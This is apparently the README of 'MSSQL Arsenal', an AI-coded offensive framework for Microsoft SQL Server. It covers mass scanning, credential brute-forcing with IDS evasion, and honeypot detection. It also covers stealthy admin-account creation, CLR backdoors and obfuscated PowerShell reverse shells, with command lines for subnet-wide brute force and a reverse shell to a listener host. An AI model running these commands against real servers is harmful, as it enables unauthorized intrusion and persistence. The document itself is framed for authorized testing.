# MSSQL Arsenal

<p align="center">
  <img src="https://img.shields.io/badge/python-3.8%2B-blue" alt="python">
  <img src="https://img.shields.io/badge/license-GPL--3.0-red" alt="license">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey" alt="platform">
  <img src="https://img.shields.io/badge/AI--Coded-DeepSeek-6C4DFF?style=flat-square" alt="AI Coded">
</p>

<p align="center"><strong>Advanced MSSQL Vulnerability Assessment and Exploitation Framework</strong></p>

---

## 📜 Table of Contents

- [Disclaimer (Read First)](#-disclaimer-read-first)
  - [English](#english)
  - [中文](#中文)
- [Overview](#-overview)
- [Key Features](#-key-features)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
  - [Command Line Interface](#command-line-interface)
  - [Graphical User Interface](#graphical-user-interface)
  - [Distributed Mode](#distributed-mode)
- [Architecture](#-architecture)
- [Usage Examples](#-usage-examples)
- [Results & Data View](#-results--data-view)
- [Report Generation](#-report-generation)
- [Plugin System](#-plugin-system)
- [Contributing](#-contributing)
- [License](#-license)
- [Acknowledgments](#-acknowledgments)

---

## ⚠️ Disclaimer (Read First)

### English

> **This software is intended solely for authorized security testing, educational purposes, and defensive research.**

> Unauthorized scanning, exploitation, or any form of intrusive activity against computer systems without explicit written permission from the system owner is **strictly prohibited** and may violate applicable laws, including but not limited to the Computer Fraud and Abuse Act (CFAA) in the United States, the Computer Misuse Act in the United Kingdom, and similar legislation worldwide.

By using this software, you acknowledge and agree that:

1. You have obtained **explicit written authorization** from the owner of the target system(s) prior to any interaction.
2. You assume **full legal and ethical responsibility** for all actions performed with this tool.
3. The developers and contributors of this project **shall not be held liable** for any misuse, damage, or legal consequences resulting from the use or abuse of this software.
4. This tool is provided **"as is"** without warranty of any kind, either expressed or implied.

If you do not agree with these terms, you must **immediately cease** using this software and delete all copies from your systems.

---

### 中文

**本软件仅限用于合法授权的安全测试、教学研究及防御性分析。**
未经系统所有者明确书面授权而对计算机系统进行扫描、漏洞利用或任何形式的入侵行为，均属**严格禁止**的违法行为，可能触犯《中华人民共和国刑法》第285条、第286条、《中华人民共和国网络安全法》以及世界其他国家和地区的相关法律法规。

使用本软件即表示您已充分理解并同意：

1. 在与任何目标系统交互前，您已获得该系统所有者的**明确书面授权**。
2. 您对使用本工具所进行的一切活动承担**全部法律与道德责任**。
3. 本项目的开发者与贡献者**不承担任何因滥用本工具而导致的直接或间接损失及法律后果**。
4. 本工具按**“现状”提供**，不作任何明示或暗示的担保。

若您不同意上述条款，请**立即停止**使用本软件并从您的设备中删除所有相关文件。

---

## 📖 Overview

**MSSQL Arsenal** is a comprehensive, modular framework designed for security professionals to assess the security posture of Microsoft SQL Server deployments. It combines high‑performance asynchronous scanning, advanced fingerprinting, multi‑strategy credential brute‑forcing, CVE detection, honeypot identification, and multiple post‑exploitation modules into a single cohesive toolset.

The framework supports both **command‑line** and **graphical (PyQt6)** interfaces, and can be deployed in a **distributed master‑worker** architecture for large‑scale assessments.

> ✨ *This entire project was coded by **amberz0n** with **DeepSeek** AI. Yes, an AI wrote every line of this beast — and it's production‑grade.*

---

## ✨ Key Features

### 🔍 Reconnaissance & Fingerprinting

- **Asynchronous Port Scanning** – Thousands of concurrent TCP connections using `asyncio`.
- **TDS Protocol Analysis** – Accurate extraction of server version, encryption support, and operating system hints via compliant TDS pre‑login packets.
- **IPv6 Support** – Full dual‑stack compatibility.

### 🔐 Credential Attacks

- **Dual Brute‑Force Strategies** – IP‑first and credential‑first modes optimized for different target densities.
- **Intelligent Dictionary Generation** – Automatically enriches wordlists based on target metadata (domain, company, IP).
- **NTLM / Kerberos Authentication** – Native Windows Integrated Authentication support.
- **TLS Encryption** – Seamless handling of forced encryption.
- **Rate Limiting & Jitter** – Evade simple IDS/rate‑limiting mechanisms.

### 🛡️ Vulnerability & Honeypot Detection

- **CVE Detection Engine** – JSON‑driven rules for CVE‑2020‑0618, CVE‑2019‑1068, CVE‑2020‑0610, and more.
- **Advanced Honeypot Identification** – Multi‑factor scoring based on version anomalies, response latency, sandbox artifacts, and active baiting.

### ⚙️ Exploitation Modules

- **RDP Activation** – Enables Remote Desktop and creates stealthy local administrator accounts.
- **Fileless Payloads** – XOR‑obfuscated PowerShell reverse‑TCP shells and LOLBin execution (mshta, regsvr32, rundll32).
- **CLR Assembly Backdoor** – Deploys custom .NET assemblies for high‑integrity command execution.
- **OLE Automation** – Utilizes `sp_OACreate` for command execution (often overlooked by defenders).
- **Plugin System** – Dynamically load and execute user‑defined Python exploit scripts.

### 🌐 Distributed Scanning

- **Master‑Worker Architecture** – Central task distribution with persistent SQLite queue.
- **Zombie Task Reclamation** – Automatic reassignment of stalled tasks.
- **Worker Heartbeat** – Real‑time health monitoring.

### 📊 Reporting & GUI

- **Modern PyQt6 Interface** – Dark theme, real‑time logs, progress tracking, and result table.
- **Exportable Reports** – Generate detailed JSON or HTML reports with optional password masking.

---

## 💾 Installation

### Requirements

- Python 3.8 or higher
- `pymssql` (requires FreeTDS on Linux/macOS)
- `PyQt6` (for GUI mode)
- Additional dependencies listed in `requirements.txt`

### Step‑by‑Step

```bash
# Clone the repository
git clone https://github.com/amberz0n/mssql-arsenal
cd mssql-arsenal

# (Optional) Create and activate a virtual environment
python -m venv venv
source venv/bin/activate   # Linux/macOS
venv\Scripts\activate      # Windows

# Install dependencies
pip install -r requirements.txt
```

> **Note for Linux/macOS users:**
> `pymssql` depends on FreeTDS. Install it via your package manager:
> `sudo apt install freetds-dev` (Debian/Ubuntu) or `brew install freetds` (macOS).

---

## 🚀 Quick Start

### Command Line Interface

bash

```
# Scan a single subnet with default wordlists, enable RDP exploitation, and generate an HTML report
python mssql_arsenal.py -t 192.168.1.0/24 --exploit rdp --report html

# Scan targets from a file, use custom dictionaries, limit brute‑force rate
python mssql_arsenal.py -t file://targets.txt --users users.txt --passwords pass.txt --rate-limit 10

# Use Windows authentication against a domain
python mssql_arsenal.py -t 10.0.0.1 --windows-auth --domain CORP

# Deploy a fileless reverse shell (ensure you have a listener ready)
python mssql_arsenal.py -t 192.168.1.10 --exploit fileless --lhost 10.0.0.5 --lport 4444
```

### Graphical User Interface

bash

```
python mssql_arsenal.py --gui
```

The GUI provides an intuitive tabbed interface for configuring scans, monitoring progress, viewing results, and managing distributed components.

**Scan Configuration Tab:**

[https://assets/gui\_scan\_config.png](https://assets/gui_scan_config.png)

*The main scan configuration interface – target, ports, dictionaries, authentication, and exploit settings.*

### Distributed Mode

**Master Node (task dispatcher):**

bash

```
python mssql_arsenal.py --master --master-port 9999
```

**Worker Node (executes tasks):**

bash

```
python mssql_arsenal.py --worker 192.168.1.100:9999
```

Workers automatically pull pending tasks from the master, perform full assessments, and report results back.

**Distributed Management Tab:**

[https://assets/gui\_distributed.png](https://assets/gui_distributed.png)

*Easily start/stop master and worker nodes directly from the GUI.*

---

## 🏗 Architecture

text

```
mssql_arsenal/
├── core/               # Configuration, logging, database, signals, utilities
├── scanner/            # Async port scanner, TDS banner grabber
├── bruter/             # MSSQL brute‑forcer, connection handling, dictionary generator
├── cve/                # CVE detection engine and JSON rule definitions
├── honeypot/           # Honeypot detector with active baiting
├── exploiter/          # Exploitation modules (RDP, fileless, CLR, OLE, plugins)
├── distributed/        # Master‑worker distributed scanning components
├── report/             # JSON/HTML report generators
├── gui/                # PyQt6 graphical interface
└── mssql_arsenal.py    # Main entry point
```

All modules are loosely coupled, allowing easy extension and customization.

---

## 📋 Usage Examples

| Scenario                                              | Command                                                                              |
| ------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| Scan a /24 subnet, brute force, exploit RDP           | `python mssql_arsenal.py -t 10.0.0.0/24 --exploit rdp`                           |
| Use TLS for all connections                           | `python mssql_arsenal.py -t 192.168.1.1 --tls`                                   |
| Disable honeypot detection                            | `python mssql_arsenal.py -t targets.txt --no-honeypot`                           |
| Save results to a JSON file                           | `python mssql_arsenal.py -t 172.16.0.0/16 --report json -o results.json`         |
| Run a specific plugin after successful authentication | `python mssql_arsenal.py -t 10.0.0.5 --exploit plugin --plugin my_custom_plugin` |
| Start a GUI session                                   | `python mssql_arsenal.py --gui`                                                  |

---

## 📊 Results & Data View

The GUI features a dedicated results table that aggregates all discovered targets, including their status, cracked credentials (masked by default), version information, honeypot scores, and detected CVEs.

[https://assets/gui\_results.png](https://assets/gui_results.png)

*Comprehensive results view with real‑time updates and export capabilities.*

---

## 📈 Report Generation

MSSQL Arsenal can produce detailed reports in both **JSON** and **HTML** formats. HTML reports include a responsive, dark‑themed table suitable for sharing with stakeholders.

**Example HTML report:**

![alt](https://raw.githubusercontent.com/amberz0n/mssql-arsenal/refs/heads/main/assets/report_preview.png)

---

## 🔌 Plugin System

The framework supports user‑defined exploitation plugins. Simply place a Python file in the `plugins/` directory containing an `exploit()` function with the following signature:

python

```
def exploit(ip: str, port: int, username: str, password: str, **kwargs) -> dict:
    # Your custom exploitation logic
    return {"success": True, "output": "..."}
```

The plugin receives an `execute_cmd` callable via `kwargs` for running system commands through `xp_cmdshell`. See `plugins/example.py` for a template.

---

## 🤝 Contributing

Contributions are welcome, provided they align with the project's ethical and legal guidelines. Please adhere to the following:

1. **All contributions must be for defensive or authorized testing purposes.**
2. Follow the existing code style and include docstrings for new functions.
3. Write unit tests for new functionality where feasible.
4. Update the documentation if you introduce new features or command‑line arguments.

Before submitting a pull request, ensure your changes do not introduce any functionality that could be construed as promoting unauthorized access.

---

## 📄 License

This project is licensed under the ​**GNU General Public License v3.0**​. See the [LICENSE](https://license/) file for full details.

> **Note on GPL‑3.0:**
> This license ensures that any derivative work must also be open source under the same terms, promoting transparency and collective improvement within the security community.

---

## 🙏 Acknowledgments

MSSQL Arsenal builds upon the excellent work of many open‑source projects, including:

* [pymssql](https://github.com/pymssql/pymssql) – Python interface to MSSQL
* [PyQt6](https://www.riverbankcomputing.com/software/pyqt/) – Python bindings for Qt
* [asyncio](https://docs.python.org/3/library/asyncio.html) – Asynchronous I/O framework
* [DeepSeek](https://www.deepseek.com/) – AI-assisted Programming
* The countless security researchers who have documented TDS internals and MSSQL attack surfaces.

---

<p align="center"> <strong>Use responsibly. Respect the law. Protect the innocent.</strong> </p>
